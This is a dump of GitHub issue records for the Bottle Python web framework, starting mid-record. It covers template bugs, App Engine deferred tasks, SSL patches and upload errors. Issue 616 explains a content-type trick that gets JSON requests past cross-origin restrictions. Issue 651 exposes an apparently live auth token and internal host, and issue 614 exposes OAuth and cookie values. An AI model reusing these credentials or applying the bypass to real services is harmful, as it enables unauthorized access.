ERROR    2014-09-05 19:05:43,843 deferred.py:318] Permanent failure attempting to execute task
Traceback (most recent call last):
  File ""/home/me/bin/gae-1.9.10/google/appengine/ext/deferred/deferred.py"", line 309, in post
    self.run_from_request()
  File ""/home/me/bin/gae-1.9.10/google/appengine/ext/deferred/deferred.py"", line 304, in run_from_request
    run(self.request.body)
  File ""/home/me/bin/gae-1.9.10/google/appengine/ext/deferred/deferred.py"", line 144, in run
    raise PermanentTaskFailure(e)
PermanentTaskFailure: Cannot re-init internal module __main__
```

main.py:

```
import logging
from bottle import route, run
from google.appengine.ext import deferred
import webapp2

def do_something_expensive(a, b, c=None):
    logging.info(""Doing something expensive!"")

@route('/')
def root():
    deferred.defer(do_something_expensive, ""Hello, world!"", 42, c=True)

run(server='gae')
```

app.yaml:

```
application: myapp
version: 1
runtime: python27
api_version: 1
threadsafe: false

handlers:

    - url: /.*
      script: main.py

builtins:
    - deferred: on
```

The workaround seems to be to use `script: main.bottle` in app.yaml and main.py:

```
import logging 
import bottle 
from bottle import route, run, Bottle 
from google.appengine.ext import deferred
import webapp2

def do_something_expensive(a, b, c=None):
    logging.info(""Doing something expensive!"")

bottle = Bottle()
@bottle.route('/')
def root():
    deferred.defer(do_something_expensive, ""Hello, world!"", 42, c=True)
```

This is non-obvious as the appengine error message is pretty unhelpful, and this problem does not seem to be mentioned in the documentation anywhere. It would be nice if this worked, but if that isn't possible, it should at least be documented. Perhaps bottle.run could detect that the deferred module is imported and print a warning that it will not work.
"
652,Add HTTPS/SSL Support to Eventlet Server,2014-09-03T22:08:41Z,2014-10-22T20:52:00Z,,,,
651,Return does not finish sending body,2014-08-27T22:06:21Z,2014-09-25T16:33:04Z,,,,"Using bottle 0.12.7, I see some odd issues when someone makes a mistake.

Here's the code I'm using:

```
@app.route('/api/<catchall>')
def api_catchall(catchall=None):
    """"""
    Description: A generic error message for when an API url is malformed.
                 Without this, you get the auth template thinking it's part
                 of the role path for def(segment...)
    returns: An error message saying you didn't match a valid request.
    """"""
    response.status = 422
    return {""status"": ""failure"", ""message"": ""ERROR CHECK REQUEST""}
```

This is what a proper get looks like

```
curl -i -k -X 'GET' -H 'Content-Type: application/json' -H 'X-Auth-Token: {{auth token}}' https://{{url...}}/api/bollox
HTTP/1.1 422 Unknown
Server: nginx/1.1.19
Date: Thu, 28 Aug 2014 16:04:33 GMT
Content-Type: application/json
Content-Length: 55
Connection: keep-alive

{""status"": ""failure"", ""message"": ""ERROR CHECK REQUEST""}
```

But if you make that get incorrectly (for example, you try to post data), this is what you get:

```
curl -i -k -X 'GET' -d @resour/json' -H 'X-Auth-Token: f3900aaf-a3af-425c-9fa2-04cf0cfe924b' https://api.dev.sn.mcdev.cldsrvr.com/api/bollox
HTTP/1.1 422 Unknown
Server: nginx/1.1.19
Date: Thu, 28 Aug 2014 16:13:51 GMT
Content-Type: application/json
Content-Length: 55
Connection: keep-alive

curl: (18) transfer closed with 55 bytes remaining to read
```

So Nginx/UWSGI immediately reply with the status and show they're done, they get the header for the content length, but there is no data ever sent, and no Exception raised.

I know it's kind of a weird case but it's fairly typical for someone to make a bad request against a JSON API and I haven't found a way to work around this yet.
"
650,_hkey in WSGIHeaderDict for unification,2014-08-19T18:03:36Z,2014-08-26T07:45:17Z,,,,"just unificate approach to header dict keys
"
649,static_file x4 performance improvement,2014-08-17T18:26:47Z,,,,,"Hi!

A simple change to **static_file** brings x4 speed improvement in serving static files. 

https://github.com/defnull/bottle/blob/master/bottle.py#L2488

The following reads a file for every request being made and could be inefficient if many reads occur:

```
body = '' if request.method == 'HEAD' else open(filename, 'rb')
```

Reading it into memory increases performance a lot and saves file descriptors:

```
body = '' if request.method == 'HEAD' else open(filename, 'rb').read()
```

For comparison this is the benchmark with the unchanged code:

```
Completed 1000 requests
Completed 2000 requests
Completed 3000 requests
Completed 4000 requests
Completed 5000 requests
Completed 6000 requests
Completed 7000 requests
Completed 8000 requests
Completed 9000 requests
Completed 10000 requests
Finished 10000 requests


Server Software:        
Server Hostname:        127.0.0.1
Server Port:            5000

Document Path:          /
Document Length:        741 bytes

Concurrency Level:      1000
Time taken for tests:   5.502 seconds
Complete requests:      10000
Failed requests:        102
(Connect: 0, Receive: 0, Length: 102, Exceptions: 0)
Non-2xx responses:      9898
Keep-Alive requests:    10000
Total transferred:      8884902 bytes
HTML transferred:       7651230 bytes
Requests per second:    1817.64 [#/sec] (mean)
Time per request:       550.164 [ms] (mean)
Time per request:       0.550 [ms] (mean, across all concurrent requests)
Transfer rate:          1577.10 [Kbytes/sec] received

Connection Times (ms)
          min  mean[+/-sd] median   max
Connect:        0    2   6.9      0      32
Processing:    33  540  72.6    551    1113
Waiting:       17  540  71.2    551    1076
Total:         64  543  72.7    551    1113

Percentage of the requests served within a certain time (ms)
    50%    551
    66%    555
    75%    556
    80%    557
    90%    558
    95%    629
    98%    647
    99%    652
    100%   1113 (longest request)
```

And this after:

```
Completed 1000 requests
Completed 2000 requests
Completed 3000 requests
Completed 4000 requests
Completed 5000 requests
Completed 6000 requests
Completed 7000 requests
Completed 8000 requests
Completed 9000 requests
Completed 10000 requests
Finished 10000 requests


Server Software:        
Server Hostname:        127.0.0.1
Server Port:            5000

Document Path:          /
Document Length:        3106 bytes

Concurrency Level:      1000
Time taken for tests:   1.880 seconds
Complete requests:      10000
Failed requests:        0
Keep-Alive requests:    10000
Total transferred:      32650000 bytes
HTML transferred:       31060000 bytes
Requests per second:    5318.78 [#/sec] (mean)
Time per request:       188.013 [ms] (mean)
Time per request:       0.188 [ms] (mean, across all concurrent requests)
Transfer rate:          16958.82 [Kbytes/sec] received

Connection Times (ms)
          min  mean[+/-sd] median   max
Connect:        0    3   8.9      0      36
Processing:    23  182  27.7    182     354
Waiting:       23  182  27.7    182     354
Total:         41  185  27.9    182     378

Percentage of the requests served within a certain time (ms)
    50%    182
    66%    182
    75%    183
    80%    183
    90%    194
    95%    215
    98%    253
    99%    311
   100%    378 (longest request)
```
"
648,Suppress ResourceWarning unclosed socket message,2014-08-11T16:09:48Z,2014-08-26T18:43:19Z,,,,"When working with Python 3.3 and the `debug` parameter set to `True`, the default wsgiref server will emit a `ResourceWarning: unclosed <socket.socket object, fd=3, family=2, type=1, proto=0>` message when using ctrl+c to stop the server.

This change explicitly closes the server when ctrl+c is detected, preventing the warning from being displayed.
"
647,Add SSL support for built-in WSGIRefServer,2014-08-06T15:12:01Z,2014-10-22T20:49:12Z,,,,
646,rebase() function is not working correctly,2014-08-05T08:06:07Z,,,,,"For me with Bottle v0.12.7 the template functions % rebase()  with placeholder {{base}} is not working correctly respectively it is rendered incorrectly. Firefox/Chrome shows me the HTML tags and the source code is like:

```
&lt;p&gt;Page Content ...&lt;/p&gt;
```

What am I doing wrong?

```
@route('/')
def index():
    return template('main')
```

http://bottlepy.org/docs/dev/stpl.html#template-functions

EDIT:
Same like #624. With {{!base}} it works. Please correct it in the documentation.
"
645,"Adding ""merge"" method to the module level",2014-07-31T23:54:40Z,,,,,"Right now, ""merge"" exists only if you have an instance, e.g. ""root = Bottle(); root.merge(...)""

Sometimes, you don't have a instance. Instead, you'd like to merge another module's app into the root module.

This is the case at the company I'm currently working for. The ideal solution would be to have ""bottle.merge(...)"", but we currently hvae the following workaround:

<pre>
import some_module.webservices

# Add routes from some_module.webservices.
for r in some_module.webservices.app.routes:
  route(r.rule, r.method, r.callback)
</pre>
"
644,docs in ePub or mobi format,2014-07-31T04:22:12Z,,,,,"I think that could be a good idea have an ePub or mobi format of the documentation like Flask or CherryPy.

What do you think?
"
643,Windows Style line break causes Syntax Error,2014-07-29T16:28:24Z,2015-03-03T19:24:32Z,,,,"%>\n  in Windows breaks bottle
"
642,Ctrl-C doesn't stop server when reloader is active,2014-07-26T12:04:58Z,,,,,"When `reloader=True`, Ctrl-C just sends bottle to background.
"
641,asyncio supported (Python 3.4),2014-07-25T13:28:07Z,,,,,"@defnull It has the support asyncio prediction?
"
640,Fix 602 unicode path encoding when mounting application.,2014-07-23T05:31:01Z,,,,,"fix #602 
"
639,[rfe][patch] SSL support for WSGIRefServer,2014-07-01T13:34:22Z,2015-09-25T08:34:34Z,,,,"Hi,

Built-in WSGIRefServer is useful for testing and early deployment, but lacks SSL support to be even more useful. Adding functional SSL support requires only 4 lines of code:

```
--- bottle.py.orig      2014-07-01 15:18:38.000000000 +0200
+++ bottle.py   2014-07-01 15:19:36.000000000 +0200
@@ -2662,6 +2662,10 @@
                     address_family = socket.AF_INET6

         self.srv = make_server(self.host, self.port, app, server_cls, handler_cls)
+        certfile = self.options.get('certfile', None)
+        if certfile:
+            import ssl
+            self.srv.socket = ssl.wrap_socket(self.srv.socket, certfile=certfile, server_side=True)
         self.port = self.srv.server_port # update port actual port (0 means random)
         self.srv.serve_forever()
```

Perhaps worth looking into/merging?

br,
Nino
"
638,Slow template rendering under PyPy 2.3.1,2014-06-30T22:19:50Z,,,,,"I've been profiling a relatively simple app of mine under PyPy, and the pstats dump shows a _lot_ of time spent inside flush_text with long pages. 

Something in there seems to be causing Bottle 0.13-dev (freshly pulled out of the repo) to render a page in 3 _seconds_ under PyPy instead of less than 200ms under standard Python. 

If you discount the time spent waiting for network requests, the graph below shows flush_text() as being inordinately long -- it barely registers when I run the same profile (and perform the same requests) under CPython.

![output](https://cloud.githubusercontent.com/assets/392683/3436837/3464ea0e-00a6-11e4-942a-87145244d963.png)
"
637,Broken response headers when using plugin mounted from another sub-application,2014-06-26T21:06:14Z,,,,,"Please take a look at following code snippet:

``` python
import bottle
from bottle import response

root = bottle.app()
page = bottle.app.push()

@root.route('/')
def root_func():
    return ''

@page.route('/')
def page_func():
    return ''

def plugin(callback):
    def wrapper(*args, **kwargs):
        body = callback(*args, **kwargs)
        response.set_header('Test-Header', 'Test-Value')
        return body
        # return body if not isinstance(body, bottle.HTTPResponse) else body.body
    return wrapper

root.install(plugin)
root.mount('/page', page, skip=None)

bottle.run(app=root)
```

When you enter http://127.0.0.1:8080/ the Test-Header is set correctly but on http://127.0.0.1:8080/page header isn't set at all.
When wrapper function is called from page_func, body variable is instance of HTTPResposne (it's created by Bootle.mount function), when called from root_page it is str.
The workaround is to uncomment line in wrapper function.

When body (in wrapper function) is HTTPRepsonse it doesn't contain added header and Bottle._cast method overwrites overall response headers.
I haven't found any solution to fix this issue yet. Does anyone have an idea?
"
636,What's the recommended way to stop a bottle.py server? (Handling Ctrl-C),2014-06-20T05:22:17Z,2014-07-09T08:31:16Z,,,,"Is there a recommended way to handle Ctrl-C to clean up your app and exit the server? There's a lot of discussion about this on the web, and no straightforward solution. For example see this SO question:

[http://stackoverflow.com/questions/11282218/bottle-web-framework-how-to-stop](http://stackoverflow.com/questions/11282218/bottle-web-framework-how-to-stop)
"
635,Quiet waitress,2014-06-13T20:10:38Z,2014-10-22T20:52:30Z,,,,"The waitress WSGI server can take a quiet flag to its serve method. Might as well use it to suppress a few annoying print statements.
"
634,Add PyPI badges,2014-06-09T19:08:12Z,2014-06-09T22:49:48Z,,,,"Add small PyPI badges with download, version and license information.
"
633,patch SimpleTemplate \% dropping leading space,2014-06-08T10:41:38Z,2014-06-09T16:14:20Z,,,,"patch:

```
diff --git a/bottle.py b/bottle.py
index 9c08304..d12c57a 100644
--- a/bottle.py
+++ b/bottle.py
@@ -3371,11 +3371,12 @@ class StplParser(object):
             if m:
                 text = self.source[self.offset:self.offset+m.start()]
                 self.text_buffer.append(text)
+                offs = self.offset
                 self.offset += m.end()
                 if m.group(1): # Escape syntax
                     line, sep, _ = self.source[self.offset:].partition('\n')
-                    self.text_buffer.append(m.group(2)+line+sep)
-                    self.offset += len(line+sep)+1
+                    self.text_buffer.append(self.source[offs+m.start():offs+m.start(1)]+m.group(2)+line+sep)
+                    self.offset += len(line+sep)
                     continue
                 self.flush_text()
                 self.read_code(multiline=bool(m.group(4)))
diff --git a/test/test_stpl.py b/test/test_stpl.py
index 21e8782..09ec4d7 100755
--- a/test/test_stpl.py
+++ b/test/test_stpl.py
@@ -135,6 +135,7 @@ class TestSimpleTemplate(unittest.TestCase):
     def test_escaped_codelines(self):
         self.assertRenders('\\% test', '% test')
         self.assertRenders('\\%% test', '%% test')
+        self.assertRenders('    \\% test', '    % test')

     def test_nobreak(self):
         """""" Templates: Nobreak statements""""""
```
"
632,Template,2014-06-05T16:12:40Z,2014-06-09T22:49:17Z,,,,"Environment: PyPy 2.2.1
Bottle 0.12.7

Issue:
Data tags on the same line error. Data tags on separate lines work as expected. Either scenario works on Python 2.7.6

Traceback (most recent call last):
  File ""/path/site-packages/bottle.py"", line 862, in _handle
    return route.call(*_args)
  File ""/path/site-packages/bottle.py"", line 1729, in wrapper
    rv = callback(_a, *_ka)
  File ""/path/site-packages/bottle.py"", line 3616, in wrapper
    return template(tpl_name, *_tplvars)
  File ""/path/site-packages/bottle.py"", line 3592, in template
    return TEMPLATES[tplid].render(kwargs)
  File ""/path/site-packages/bottle.py"", line 3396, in render
    self.execute(stdout, env)
  File ""/path/site-packages/bottle.py"", line 3383, in execute
    eval(self.co, env)
  File ""/path/site-packages/bottle.py"", line 189, in __get__
    value = obj.**dict**[self.func.**name**] = self.func(obj)
  File ""/path/site-packages/bottle.py"", line 3341, in co
    return compile(self.code, self.filename or '<string>', 'exec')
  File ""/path/views/app.tpl"", line 1
    _printlist((u'<p>', _escape(username}}{{role), u'</p>\n',))
                                       ^

app.tpl

<p>{{username}}{{role}}</p>


app.py
import bottle
from bottle import route, run, template, view

@bottle.route('/admin')
@bottle.view('app')
def admin():
    return dict(
            role=""admin"",
            username=""tom""
        )
"
631,report back actual port when using port 0,2014-06-03T18:46:20Z,2014-06-05T08:44:49Z,,,,"This patch reports the actual port being listened on to the command line.
I only did this for WSGIRefServer, maybe it should be done for others as well?

For example you'll now see 
    Listening on http://localhost:39881/
rather than
    Listening on http://localhost:0/
"
630,Add 422 response code string,2014-05-28T19:22:02Z,2014-05-28T19:36:00Z,,,,"This response code is starting to be used more and more and in particular on Rails.
"
629,No space left on device when upload file,2014-05-26T02:55:08Z,2014-05-26T03:30:48Z,,,,"I use bottle (Bottle v0.11.6)  to implement a file-upload function as below:

```
def save_file(filedata, filename):
    with open(filename, 'wb') as fp:
        while 1:
            fd = filedata.file.read(4096)
            if not fd:
                break
            fp.write(fd)

```

when I upload small file , everything is ok, when I upload file with size 1000M, then I got the error message: `IOError: [Errno 28] No space left on device`
but the free space is enough (I save the file in /home/balabala...)

```
~ ❯ df -h
Filesystem Size Used Avail Use% Mounted on
/dev/sda1 18G 9.4G 7.1G 57% /
dev 1.5G 0 1.5G 0% /dev
run 1.5G 28M 1.5G 2% /run
tmpfs 1.5G 0 1.5G 0% /dev/shm
tmpfs 1.5G 0 1.5G 0% /sys/fs/cgroup
tmpfs 1.5G 1002M 481M 68% /tmp
tmpfs 297M 4.0K 297M 1% /run/user/1000
```
"
628,fails when request content type is application/json but the body is empty,2014-05-25T02:32:40Z,2014-05-26T15:37:45Z,,,,
627,Correct way to stop and clean up,2014-05-15T14:28:16Z,2014-05-20T15:10:35Z,,,,"So, we're using Bottle to provide a built-in web interface for our bot project. I looked around, the closest thing I could find for stopping a bottle app (I mean, completely - unloading plugins, resetting routes, but most importantly **stopping the server and freeing up the listening port**) was `app.close()`.

But uh.. it doesn't do this.

So! What's the ""official"" way to achieve this? I'm having a hard time finding decent information on this. Also, if it's of note, we're using the Twisted server adapter (as the rest of the application also uses Twisted).

Code can be found here: https://github.com/UltrosBot/Ultros-contrib/blob/master/Web/plugins/web/__init__.py#L195

Also, I did notice the `app.reset()` function - this doesn't solve the problem of the port still not being freed up, though.
"
626,Doesn't work FileUpload.save('tmp/'),2014-05-13T09:10:15Z,2014-05-14T08:53:45Z,,ValueError,ValueError: I/O operation on closed file,"I try to save image, using code from you Tutorial.
It return:

Traceback (most recent call last):
  File ""/usr/local/lib/python3.4/dist-packages/bottle.py"", line 862, in _handle
    return route.call(*_args)
  File ""/usr/local/lib/python3.4/dist-packages/bottle.py"", line 1728, in wrapper
    rv = callback(_a, **ka)
  File ""./imgtest2.py"", line 34, in do_upload
    img_src.save('.') # http://bottlepy.org/docs/dev/_modules/bottle.html#FileUpload
  File ""/usr/local/lib/python3.4/dist-packages/bottle.py"", line 2390, in save
    self._copy_file(fp, chunk_size)
  File ""/usr/local/lib/python3.4/dist-packages/bottle.py"", line 2368, in _copy_file
    read, write, offset = self.file.read, fp.write, self.file.tell()
ValueError: I/O operation on closed file

Do you know what the problem is?
I use Ubuntu 14.04, Bottle v0.12.6 and Python 3.4.0.
"
625,typo tutorial.rst,2014-05-10T00:48:36Z,2014-10-22T20:53:28Z,,,,"add a note to novice
"
624,Possible documentation error: rebase(),2014-05-06T17:23:48Z,,,,,"The example for template function `rebase()` includes `{{base}}` as the insertion variable.  This escapes the template contents and the example code fails to render properly.  The variable should be `{{!base}}` instead.
"
623,FileCheckerThread: thread.interrupt_main -> sys.exit,2014-05-05T10:41:56Z,,,,,"Should fix https://github.com/defnull/bottle/pull/622
"
622,Support Reloading with Eventlet,2014-05-04T22:07:43Z,,,,,"This should allow the reloader to work with eventlet. Without the timeout, the reloader blocks when
using eventlet.
"
621,Enhance Eventlet Support,2014-05-04T17:06:37Z,2014-05-05T07:17:42Z,,,,"- add patching check (like gevent)
- add support for eventlet socket arguments (`backlog` and `family`)
"
620,"loaded plugins run via command line, ref #619",2014-05-03T13:32:21Z,2014-05-05T07:27:00Z,,,,
619,plugins can't be loaded from the command line,2014-05-02T23:20:59Z,,,,,"When running `python -m bottle --plugin module:plugin module:app`, the plugin isn't loaded. Instead, Bottle tries to install the string ""module:plugin"" as a plugin, raising `TypeError: Plugins must be callable or implement .apply()`. To fix, change lines 2977 and 2978 in bottle.run() from:

```
        for plugin in plugins or []:
            app.install(plugin)
```

to:

```
        for plugin in plugins or []:
            if isinstance(plugin, basestring):
                plugin = load(plugin)
            app.install(plugin)
```
"
618,0.12.7 tests fail with python 2.7 in test_server/tearDown,2014-04-30T00:53:56Z,,,AssertionError,AssertionError: AttributeError: 'NoneType' object has no attribute 'split',"The full error message:

```
======================================================================
ERROR: test_simple (test_server.TestServer)
Test a simple static page with this server adapter.
----------------------------------------------------------------------
Traceback (most recent call last):
  File ""/build/python-bottle/src/python2-bottle/test/test_server.py"", line 77, in tearDown
    raise AssertionError(line.strip().decode('utf8'))
AssertionError: AttributeError: 'NoneType' object has no attribute 'split'

----------------------------------------------------------------------
Ran 328 tests in 6.375s

FAILED (errors=1)
```
"
617,test_multipart fails on python 3.4,2014-04-26T00:04:19Z,2014-04-29T05:46:23Z,,ValueError,ValueError: I/O operation on closed file.,"This is the only failed test on Python 3.4:

```
======================================================================
ERROR: test_multipart (test_environ.TestRequest)
Environ: POST (multipart files and multible values per key)
----------------------------------------------------------------------
Traceback (most recent call last):
  File ""/build/python-bottle/src/bottle/test/test_environ.py"", line 327, in test_multipart
    self.assertEqual(cmp, request.POST['file1'].file.read())
ValueError: I/O operation on closed file.

----------------------------------------------------------------------
```
"
616,json content-type not restrictive enough,2014-04-24T19:09:42Z,2014-04-25T21:28:20Z,,,,"Hi,

There is a problem with the content-type parsing that was introduced in #226 .
Bottle will accept things like ""text/plain;application/json"" as a json content type which might be used by an attacker to bypass security mechanisms.
For example Chrome will not allow cross-origin xmlhttprequests with the content type set to ""application/json"" but you can set it to ""text/plain;application/json"" instead and bottle will accept it.
"
615,Minor fix in the documentation,2014-04-16T07:13:52Z,2014-04-16T08:35:11Z,,,,"In the example present in the rebase() documentation, disable escaping for the evaluation of ""base"". Minor spelling fix.
"
614,redirect function with 500 Internal Server Error,2014-04-15T06:33:06Z,,,"Error, Exception","Error: 500 Internal Server Error, Exception:","![image](https://cloud.githubusercontent.com/assets/1452677/2704120/18fc8136-c466-11e3-968b-673ced3b49be.png)

Error: 500 Internal Server Error

Sorry, the requested URL 'http://stock.chenpeng.info/oauth_login' caused an error:

Internal Server Error
Exception:

Location: https://api.weibo.com/oauth2/authorize?client_id=2617906645&response_type=code&redirect_uri=http://stock.chenpeng.info/oauth_login_callback&state=zhizuzhefu-6be5a820-94c3-314b-9b92-4688353323a2
Content-Type: text/html; charset=UTF-8
Set-Cookie: oauth_state=""!Omsnw7wB5XTeUlGrX96pDQ==?gAJVC29hdXRoX3N0YXRlcQFVL3poaXp1emhlZnUtNmJlNWE4MjAtOTRjMy0zMTRiLTliOTItNDY4ODM1MzMyM2EycQKGcQMu""
Traceback:

Traceback (most recent call last):
  File ""/data1/www/htdocs/727/chenpeng/1/stock/system_stock/bottle.py"", line 862, in _handle
    return route.call(*_args)
  File ""/data1/www/htdocs/727/chenpeng/1/stock/system_stock/bottle.py"", line 1727, in wrapper
    rv = callback(_a, **ka)
  File ""/data1/www/htdocs/727/chenpeng/1/stock/app_stock/controller/oauth.py"", line 68, in C_oauth_login
    redirect(target_url)
  File ""/data1/www/htdocs/727/chenpeng/1/stock/system_stock/bottle.py"", line 2417, in redirect
    raise res
HTTPResponse
"
613,Fix view decorator when returning None,2014-04-13T14:29:30Z,2014-04-13T20:27:48Z,,Notice,Notice: I HAVE NOT TESTED THIS!,"I was reading the code for another reason, and noticed that changed line might be wrong. At least it looked like it was. I created this PR to inform about the issue.

Notice: I HAVE NOT TESTED THIS!
"
612,Replicate orrection #611 0.12 to master,2014-04-11T22:47:27Z,2014-04-12T11:08:37Z,,,,"ResourceWarning: unclosed file <_io.BufferedReader
"
611,Fixed bottle.py:3343: ResourceWarning: unclosed file <_io.BufferedReader...,2014-04-11T17:00:13Z,2014-04-11T20:55:04Z,,,,"The ressourceWarning appeard with Py 3.4 (or may be I did not notice it before....)
"
610,Documentation on gzipping is skeletal,2014-04-08T14:04:17Z,,,,,"The [docs](http://bottlepy.org/docs/dev/recipes.html#gzip-compression-in-bottle) say:

> ... it is the recommendation of the Bottle project that Gzip compression is best handled by the WSGI server Bottle runs on top of. WSGI servers such as cherrypy provide a `GzipFilter` middleware that can be used to accomplish this.

However, there's no explanation of how this can actually be done using just `bottle` and `cherrypy`, and [no one else seems to know either](https://stackoverflow.com/q/22892388/102441).

Can a more detailed example be added to the docs?
"
609,Dead link in documentation,2014-04-06T09:52:53Z,,,,,"The link in the [GZIP COMPRESSION IN BOTTLE](http://bottlepy.org/docs/dev/recipes.html#gzip-compression-in-bottle) section to the ""GzipFilter middleware"" for cherrypy leads to a 404.
"
608,Don't run the twisted reactor if it's already running,2014-04-05T13:30:54Z,2014-04-06T18:41:58Z,,,,"This prevents nasty errors when embedding Bottle within twisted apps that already make use of the reactor (and therefore also start it).
"
607,"""% end"" don't close the block properly",2014-04-05T05:22:18Z,2014-04-05T12:55:46Z,,,,"This is an extreme case but it could happen and it is not easy to debug.
Unfortunately I don't know enough about the regular expression to provide a patch.

```
@bottle.route('/')
def hello():
    list1 = [1, 2, 3]
    item = 'abcd'
    return template('test', {'list1': list1, 'item': item})

<ul>
  % for item in list1:
  <li>{{item}}</li>
  % end
</ul>
{{item}}
```

This code return 
- 1
- 2
- 3

3  // instead of abcd
"
606,Emulate {% block something %} and {% endblock %},2014-03-31T15:21:52Z,,,,,"A poorly written code to emulate jinja2 like block. (inspired from this conversation: https://twitter.com/goFrendiAsgard/status/450462203020210176)

``` python
from bottle import template as bottle_template
from bottle import TEMPLATE_PATH

def template(*args, **kwargs):
    args_list = list(args)
    # get view_path
    view_path = args_list[0]    
    # get template's content
    default_extensions = ['html', 'tpl', 'stpl', 'thtml']
    extension = view_path.split('.')[-1]
    for template_path in TEMPLATE_PATH:
        if extension in default_extensions:
            path = os.path.join(template_path, view_path)
            if os.path.exists(path):
                break
        else:
            for default_extension in default_extensions:
                path = os.path.join(template_path, view_path + '.' + default_extension)
                if os.path.exists(path):
                    break
    content = file_get_contents(path)
    # add \n to prevent content rendered as path
    if not '\n' in content:
        content = content + '\n'
    # create block pattern
    block_pattern = r'{%( *)block( *)([A-Za-z0-9_-]*)( *)%}((.|\n)*?){%( *)endblock( *)%}+?'
    # get block_chunks
    block_chunks = re.findall(block_pattern, content)
    # remove all literal block from content
    content = re.sub(block_pattern, r'', content)
    # get content by rendering template
    args_list[0] = content
    args = tuple(args_list)
    content = _bottle_template(*args, **kwargs)
    for chunk in block_chunks:
        block_name = chunk[2]
        block_content = chunk[4]
        # change {% parent %} into % __base_block_BLOCKNAME()\n
        block_content = re.sub(r'{%( *)parent( *)%}+?',
                               r'\n% __base_block_'+block_name+'()\n',
                               block_content)
        content = '% def __block_' + block_name + '():\n' + block_content + '\n% end\n' + content
    # change 
    #    {% block X %}Y{% endblock %}"" 
    # into 
    #     % def __base_block_X:
    #         Y
    #     % end
    #     % setdefault('__block_X', __base_block_X)
    #     % __block_X()
    content = re.sub(block_pattern, 
                     r'% def __base_block_\3():\n\5\n% end\n% setdefault(""__block_\3"", __base_block_\3)\n%__block_\3()\n',
                     content)
    # render again
    args_list[0] = content
    args = tuple(args_list)
    content = _bottle_template(*args, **kwargs)
    return _bottle_template(*args, **kwargs)
```

The current implementation is very simple (yet not optimal). Basically it read <code>{% block %}</code> and <code>{% endblock %}</code>, and override current template content. The drawback is it need to call bottle's original template function twice.

Any idea to make it better and merge it to the main branch?
"
605,update Google App Engine docs url,2014-03-27T12:46:40Z,2014-04-02T11:42:03Z,,,,
604,add Bottle Beaker plugin on docs plugin index,2014-03-26T18:47:49Z,2014-03-26T18:53:47Z,,,,
603,Multiple Bottle applications from the same source files,2014-03-21T15:01:18Z,2014-03-28T10:01:13Z,,,,"Hello

Is it possible to create multiple Bottle applications from the same source module?

In my case I've an application that works with a database which depends on the source URL or the request.

In main.py:

```
app = bottle.app()
new_app = bottle.load_app('archive.app:setup(""customer1"")')
app.mount('/archive/customer1', new_app)
print new_app

new_app = bottle.load_app('archive.app:setup(""customer2"")')
app.mount('/archive/customer2', new_app)
print new_app

new_app = bottle.load_app('archive.app:setup(""customer3"")')
app.mount('/archive/customer3', new_app)
print new_app
```

In archive/app.py:

```
app = bottle.app()
def setup(customer):
  """"""Initial setup, called during the application mount""""""
  app.customer = customer
  return app

@app.route('/list')
def serve():
  return my_results()
```

The documentation [about load_app](http://bottlepy.org/docs/dev/api.html#bottle.load_app) tells that a new application is created but in my case
all the three new_app objects results to be the same (because the source files are the same) and therefore all the use of app.customer results in the same customer3 value.

Is there a way to run multiple applications based on the same source files?
"
602,UTF8 path string invalid when using app.mount(),2014-03-21T14:36:41Z,,Bug,Error,Error: 400 Bad Request,"test.py:

``` python
#!/usr/bin/python
import bottle
import testapp

bottle.debug(True)
app = bottle.Bottle()

app.mount('/test',testapp.app)

app.run(reloader=True, host='0.0.0.0', port=8080)

run(host=""localhost"",port=8080)
```

testapp.py:

``` python
import bottle

app = bottle.Bottle()

@app.route(""/:category"", method=[""GET"",""POST""])
def admin(category):
    try:
        return category
    except Exception(e):
        print (""e:""+str(e))
```

Trying to access: http://127.0.0.1:8080/test/äöü results in following error:

```
Error: 400 Bad Request
Invalid path string. Expected UTF-8
```

Running Python 3.4.0 with python-bottle 0.12.5.
"
601,Update documentation for App Engine deployments.,2014-03-16T23:19:25Z,2014-03-26T09:41:24Z,,,,"Hi, this is a patch for the docs, to steer people away from the gae server adapter since it is only useful for old app engine deployments. The Python 2.7 runtime environment supports WSGI applications directly and since Jan 2014 you can't create a new Google app engine application with the  2.5 runtime anyway.

I'm more than happy to work on the wording in this patch if you think it needs it.
"
600,Bottle (run and reloader true) + gevent Exception in thread Thread-1:,2014-03-14T21:44:42Z,,,,,"Is error?

```
Exception in thread Thread-1:
Traceback (most recent call last):
  File ""/opt/python2.7/lib/python2.7/threading.py"", line 810, in __bootstrap_inner
    self.run()
  File ""/home/avelino/.virtualenvs/mining/lib/python2.7/site-packages/bottle.py"", line 3154, in run
    thread.interrupt_main()
KeyboardInterrupt
```
"
599,got KeyboardInterrupt with chrome ,2014-03-13T03:11:53Z,,,,,"The bug( #155 ) is relative with this,the code is:

```
from bottle import route, run, template

@route('/hello/<name>')
def index(name):
    return template('<b>Hello OK {{name}}</b>!', name=name)

run(host='localhost', port=9080,debug=True,reloader=True)
```

the exception is:

```
Exception happened during processing of request from ('127.0.0.1', 51003)
Traceback (most recent call last):
  File ""/usr/local/Cellar/python/2.7.6/Frameworks/Python.framework/Versions/2.7/lib/python2.7/SocketServer.py"", line 295, in _handle_request_noblock
    self.process_request(request, client_address)
  File ""/usr/local/Cellar/python/2.7.6/Frameworks/Python.framework/Versions/2.7/lib/python2.7/SocketServer.py"", line 321, in process_request
    self.finish_request(request, client_address)
  File ""/usr/local/Cellar/python/2.7.6/Frameworks/Python.framework/Versions/2.7/lib/python2.7/SocketServer.py"", line 334, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File ""/usr/local/Cellar/python/2.7.6/Frameworks/Python.framework/Versions/2.7/lib/python2.7/SocketServer.py"", line 649, in __init__
    self.handle()
  File ""/usr/local/Cellar/python/2.7.6/Frameworks/Python.framework/Versions/2.7/lib/python2.7/wsgiref/simple_server.py"", line 116, in handle
    self.raw_requestline = self.rfile.readline()
  File ""/usr/local/Cellar/python/2.7.6/Frameworks/Python.framework/Versions/2.7/lib/python2.7/socket.py"", line 447, in readline
    data = self._sock.recv(self._rbufsize)
KeyboardInterrupt
```

And the bottle version: 0.12.5
"
598,Fix sample websocket via gevent-websocket,2014-03-12T19:09:28Z,2014-03-12T19:13:46Z,,,,"update api: https://pypi.python.org/pypi/gevent-websocket/
"
597,Updated error page template,2014-03-12T07:33:52Z,2014-03-12T13:27:14Z,,,,"I removed some unused imports and changed ""font-family: sans"" to ""font-family: sans-serif"", which I assume it was meant to be.
"
596,Set new pypi to MongoDB Bottle Plugin,2014-03-11T18:06:46Z,2014-03-11T18:09:53Z,,,,"update docs
"
